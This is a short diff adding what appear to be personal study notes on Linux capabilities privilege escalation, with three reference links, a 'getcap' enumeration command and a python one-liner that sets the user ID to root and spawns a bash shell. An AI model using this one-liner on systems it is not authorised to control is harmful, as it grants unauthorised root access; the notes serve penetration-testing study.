@@ -1,0 +1,12 @@
+CAPABILITIES:--
+-----------------------------
+https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
+
+https://mn3m.info/posts/suid-vs-capabilities/
+
+https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+
+
+1)getcap -r / 2>/dev/null ---------to check the capabilities in a system
+
+2)/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
